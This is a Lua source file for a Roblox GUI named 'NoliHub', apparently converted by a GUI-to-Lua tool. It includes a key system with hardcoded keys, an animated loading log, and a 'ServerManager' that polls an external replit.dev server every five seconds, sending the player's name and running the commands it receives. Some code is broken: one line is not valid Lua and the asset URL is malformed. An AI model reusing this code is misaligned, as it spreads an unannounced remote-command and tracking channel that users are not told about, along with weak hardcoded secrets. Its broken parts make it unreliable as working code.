-- StarterGui.NoliHub.KeySystem.KeyBox.LocalScript
local function C_12b()
local script = G2L["12b"];
	-- Основной скрипт
	
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	local Players = game:GetService("Players")
	
	local moduleId = 100017106644832 -- Замените на ID вашего модуля в Marketplace
	
	-- Функция для загрузки содержимого модуля
	local function loadModuleFromMarketplace(moduleId)
		local assetId = moduleId
		local url = "https://roblox.com/library" .. assetId
		local response = HttpService:GetAsync(url)
		return response
	end
	
	-- Декодируем JSON строку в таблицу
	local function decodeKeysJson(keysJson)
		return HttpService:JSONDecode(keysJson)
	end
	
	-- Декодирование BASE64
	local function base64Decode(data)
		local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
		data = string.gsub(data, '[^'..b..'=]', '')
		return (data:gsub('.', function(x)
			if x == '=' then return '' end
			local r,f='',(b:find(x)-1)
			for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
			return r;
		end):gsub('%d%d%d%d%d%d%d%d', function(x)
			if (#x ~= 8) then return '' end
			local c=0
			for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
			return string.char(c)
		end))
	end
	
	-- Проверка ключа
	local function checkKey(inputKey)
		local keysJson = loadModuleFromMarketplace(moduleId)
		local keyData = decodeKeysJson(keysJson)
		for _, keyInfo in ipairs(keyData.keys) do
			local decodedKey = base64Decode(keyInfo.key)
			if inputKey == decodedKey then
				if keyInfo.Blocked then
					print("Этот ключ заблокирован!")
					return "Blocked"
				end
				if keyInfo.Freezed then
					print("Этот ключ заморожен!")
					return "Freezed"
				end
				print("Ключ действителен! Тип ключа: " .. keyInfo.type)
				return keyInfo.type
			end
		end
		print("Неверный ключ!")
		return "Invalid"
	end
	
	-- Получаем TextBox и подключаем событие для проверки ключа
	local player = Players.LocalPlayer
	local textBox = script.Parent.KeyText
	
	textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local inputKey = textBox.Text
			local result = checkKey(inputKey)
			if result == "Freemium" then
				print("Доступ открыт для Freemium!")
			elseif result == "Premium" then
				print("Доступ открыт для Premium!")
			elseif result == "Blocked" then
				print("Доступ закрыт: ключ заблокирован!")
			elseif result == "Freezed" then
				print("Доступ закрыт: ключ заморожен!")
			else
				print("Доступ закрыт: неверный ключ!")
			end
		end
	end)
	
end;
task.spawn(C_12b);
-- StarterGui.NoliHub.KeySystem.KeySystem
local function C_13c()
local script = G2L["13c"];
	-- Определяем ключи
	local premiumKey = "freepremium"
	local freeKey = "nolimanomontop"
	
	-- Получаем TextBox
	local textBox = script.Parent.KeyBox.KeyText
	
	-- Получаем BoolValue для премиум и бесплатных ключей
	local premiumBoolValue = script.Parent.Parent:WaitForChild("PremiumActive")
	local freeBoolValue = script.Parent.Parent:WaitForChild("FreeActive")
	
	-- Функция для проверки ключа
	local function checkKey()
		local inputKey = textBox.Text
		if inputKey == premiumKey then
			print("Активирован премиум ключ!")
			script.Parent.TextLabel.Correct.Enabled = true
			premiumBoolValue.Value = true
			freeBoolValue.Value = false -- Отключаем бесплатный, если активирован премиум
		elseif inputKey == freeKey then
			print("Активирован бесплатный ключ.")
			script.Parent.TextLabel.Correct.Enabled = true
			freeBoolValue.Value = true
			premiumBoolValue.Value = false -- Отключаем премиум, если активирован бесплатный
		else
			print("Ключ неверный.")
			script.Parent.TextLabel.Incorrect.Enabled = true
		end
	end
	
	-- Событие для проверки при снятии фокуса с TextBox
	textBox.FocusLost:Connect(function(enterPressed)
		checkKey()
	end)
	
end;
task.spawn(C_13c);
-- StarterGui.NoliHub.KeySystem.Logging
local function C_141()
local script = G2L["141"];
	-- Создаем BindableEvent
	local LogEvent = Instance.new("BindableEvent")
	LogEvent.Name = "LogEvent"
	LogEvent.Parent = game.ReplicatedStorage -- Место, где будет находиться событие
	
	-- Ссылка на ScrollFrame
	local scrollingFrame = script.Parent:FindFirstChild("Log") -- Используйте FindFirstChild для безопасности
	if not scrollingFrame or not scrollingFrame:IsA("ScrollingFrame") then
		error("ScrollFrame не найден!")
	end
	
	scrollingFrame.ScrollBarThickness = 4 -- Включаем прокрутку
	scrollingFrame.ScrollingEnabled = false -- Отключаем прокрутку пользователем
	
	-- Создаем UIListLayout для автоматического размещения элементов
	local uiListLayout = Instance.new("UIListLayout")
	uiListLayout.Parent = scrollingFrame
	uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uiListLayout.Padding = UDim.new(0, 5) -- Отступ между сообщениями
	
	-- Параметры для логов
	local logSettings = {
		Error = {
			Color = Color3.fromRGB(255, 0, 0),
			Icon = "rbxassetid://6031071053", -- Иконка для Error
		},
		Warning = {
			Color = Color3.fromRGB(255, 255, 0),
			Icon = "rbxassetid://6031071050", -- Иконка для Warning
		},
		Info = {
			Color = Color3.fromRGB(255, 255, 255),
			Icon = "rbxassetid://6031071050", -- Иконка для Info
		},
	}
	
	-- Функция для добавления логов
	local function addLog(level, message)
		local settings = logSettings[level]
		if not settings then return end
	
		-- Создание фрейма для лога
		local logFrame = Instance.new("Frame")
		logFrame.Size = UDim2.new(1, 0, 0, 50) -- Размер фрейма для сообщения
		logFrame.BackgroundTransparency = 1
		logFrame.BorderSizePixel = 0
		logFrame.LayoutOrder = #scrollingFrame:GetChildren() + 1
		logFrame.Parent = scrollingFrame
	
		-- Цветная полоса слева
		local colorBar = Instance.new("Frame")
		colorBar.Size = UDim2.new(0, 10, 1, 0)
		colorBar.BackgroundColor3 = settings.Color
		colorBar.BorderSizePixel = 0
		colorBar.Position = UDim2.new(0, 0, 0, 0)
		colorBar.Parent = logFrame
		colorBar.Transparency = 0.7
	
		-- Иконка
		local icon = Instance.new("ImageLabel")
		icon.Size = UDim2.new(0, 38, 0, 38)
		icon.Position = UDim2.new(0, 10, 0, 6) -- Иконка немного вниз, чтобы выровнять
		icon.Image = settings.Icon
		icon.BackgroundTransparency = 1
		icon.Parent = logFrame
		icon.Transparency = 0.7
	
		-- Текст сообщения
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, -48, 1, 0) -- Учитываем размер иконки и цветной полосы
		textLabel.Position = UDim2.new(0, 48, 0, 0) -- Текст справа от иконки
		textLabel.Text = message
		textLabel.TextColor3 = Color3.fromRGB(0, 0, 0) -- Черный цвет текста
		textLabel.BackgroundTransparency = 1
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.TextWrapped = true
		textLabel.Parent = logFrame
		textLabel.TextColor = BrickColor.new("White")
		textLabel.TextTransparency = 0.7
	
		-- Обновление размера CanvasSize
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, scrollingFrame.UIListLayout.AbsoluteContentSize.Y)
	
		-- Автоматическая прокрутка до последнего сообщения
		scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.CanvasSize.Y.Offset - scrollingFrame.AbsoluteSize.Y)
	
		-- Удаление старых сообщений через 30 секунд
		delay(30, function()
			logFrame:Destroy()
			-- Обновление CanvasSize после удаления сообщения
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, scrollingFrame.UIListLayout.AbsoluteContentSize.Y)
		end)
	end
	
	-- Функция для очистки всех сообщений
	local function clearLogs()
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			if child:IsA("Frame") then
				child:Destroy()
			end
		end
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0) -- Сброс размера CanvasSize
	end
	
	-- Подписка на событие
	LogEvent.Event:Connect(addLog)
	
	--whaa
	LogEvent:Fire("Error", "Ключ система не активна")
	wait(2)
	LogEvent:Fire("Info", "Добро пожаловать!")
	wait(2)
	LogEvent:Fire("Info", "Загрузка закладок...")
	wait(5)
	LogEvent:Fire("Info", "Подписка на nolimanom...")
	wait(2)
	LogEvent:Fire("Info", "Обращение к UserList...")
	if script.Parent.Parent.MainFrame.Screens.Home.Profile.PlayerName.Text == "nnolimanom" then
		LogEvent:Fire("Info", "Добро пожаловать владелец!")
	elseif script.Parent.Parent.MainFrame.Screens.Home.Profile.PlayerName.Text == "nnnolimanom" then
		LogEvent:Fire("Error", "Получен ответ UserInBlacklist")
		wait(3)
		LogEvent:Fire("Warning", "Скрипт будет закрыт в течении семи секунд")
		wait(7)
		script.Parent.Parent:Destroy()
	elseif script.Parent.Parent.Values.Premium.Value == true then
	script.Parent.Parent.MainFrame.Screens.Home.Profile.Crown.Visible = true
	script.Parent.Parent.MainFrame.Screens.Home.Profile.Premium.Visible = true
	script.Parent.Parent.MainFrame.Screens.Home.Profile.User.Visible = false
	elseif script.Parent.Parent.Values.Freemium.Value == true then
	script.Parent.Parent.MainFrame.Screens.Home.Profile.Crown.Visible = false
	script.Parent.Parent.MainFrame.Screens.Home.Profile.Premium.Visible = false
	script.Parent.Parent.MainFrame.Screens.Home.Profile.User.Visible = true
	end
	wait(6)
	LogEvent:Fire("Warning", "Загружено")
	wait(2)
	LogEvent:Fire("Error", "Вы используете альфа версию, сообщайте ошибки nolimanom-у")
	wait(5)
	LogEvent:Fire("Info", "Переход к главному экрану")
	wait(1)
	script.Parent.Parent.Loading.Visible = false
	script.Parent.Parent.MainFrame.Visible = true
	script.Parent.LoaderTexts.LocalScript.Enabled = false
	wait(2)
	script.Parent.Parent.MainFrame.Welcome.MoveThis.Value = true
	
end;
task.spawn(C_141);
-- StarterGui.NoliHub.KeySystem.Drag
local function C_142()
local script = G2L["142"];
	local TweenService = game:GetService("TweenService")
	local UserInputService = game:GetService("UserInputService")
	
	-- Функция для плавного перемещения фрейма
	local function smoothMove(frame, targetPosition)
		local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
		local tween = TweenService:Create(frame, tweenInfo, {Position = targetPosition})
		tween:Play()
	end
	
	-- Функция для обработки начала перемещения
	local function makeDraggable(frame)
		local dragging = false
		local dragStart
		local startPos
	
		local function onInputBegan(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = frame.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end
	
		local function onInputChanged(input)
			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local delta = input.Position - dragStart
				local newPosition = UDim2.new(
					startPos.X.Scale,
					startPos.X.Offset + delta.X,
					startPos.Y.Scale,
					startPos.Y.Offset + delta.Y
				)
				smoothMove(frame, newPosition)
			end
		end
	
		frame.InputBegan:Connect(onInputBegan)
		frame.InputChanged:Connect(onInputChanged)
	end
	
	-- Пример использования
	local frame = script.Parent -- Укажите ваш фрейм
	makeDraggable(frame)
	
end;
task.spawn(C_142);
-- StarterGui.NoliHub.Startup
local function C_143()
local script = G2L["143"];
	--set screen to profile or just home
	script.Parent.MainFrame.Screens.Scripts.Visible = false
	script.Parent.MainFrame.Screens.Home.Visible = true
	
	--set up menu
	script.Parent.MainFrame.Shadow.Menu.Visible = true
	
	--self-explanation
	script.Parent.MainFrame.Visible = true
end;
task.spawn(C_143);
-- StarterGui.NoliHub.CloseNopen.Drag
local function C_146()
local script = G2L["146"];
	local button = script.Parent
	local visible = true
	
	local function leftClick()
	if visible == true then
	script.Parent.Text = "Показать"
	script.Parent.Parent.MainFrame.Visible = false
	visible = false
	else
	script.Parent.Text = "Скрыть"
	script.Parent.Parent.MainFrame.Visible = true
	visible = true
	end
	end
	button.MouseButton1Click:Connect(leftClick)
end;
task.spawn(C_146);
-- StarterGui.NoliHub.CloseNopen.LocalScript
local function C_147()
local script = G2L["147"];
	frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end;
task.spawn(C_147);
-- StarterGui.NoliHub.ServerManager
local function C_148()
local script = G2L["148"];
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	
	local playerName = Players.LocalPlayer.Name
	local serverUrl = "https://0e2273f6-dbbb-4f46-aaf7-66b7703edc00-00-1grhnbgj4qi73.kirk.replit.dev/get_command"  -- Замените на ваш URL
	
	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	
	local function executeCommand(command)
		if command == "Update" then
			script.Parent.MainFrame.Shadow.BoolValue.Value = true
			script.Parent.MainFrame.Shadow.Restart
		elseif command == "Hide" then
			Frame.Visible = false  -- Скрываем фрейм
		end
	end
	
	local function checkForCommand()
		local success, response = pcall(function()
			return HttpService:GetAsync(serverUrl .. "?player=" .. playerName)
		end)
	
		if success and response then
			local data = HttpService:JSONDecode(response)
			if data and (data.player == "ALL" or data.player == playerName) then
				executeCommand(data.command)
			end
		else
			print("Не удалось получить команду с сервера")
		end
	end
	
	while true do
		wait(5)
		checkForCommand()
	end
	
end;
task.spawn(C_148);

return G2L["1"], require;
